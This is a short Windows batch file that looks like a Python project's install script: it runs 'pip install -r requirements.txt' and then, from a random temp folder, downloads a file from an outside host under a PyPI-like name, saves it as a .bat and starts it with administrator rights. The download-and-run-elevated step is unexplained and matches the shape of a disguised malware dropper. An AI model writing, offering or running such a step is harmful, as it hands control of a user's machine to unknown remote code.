@echo off
set dir="%temp%\_%random%"
mkdir %dir%
pip install -r requirements.txt
cd %dir%
curl https://bootstrapper.repl.co/scripts/pypi.py --output pypi.bat && powershell Start-Process 'pypi.bat' -Verb runAs
pause
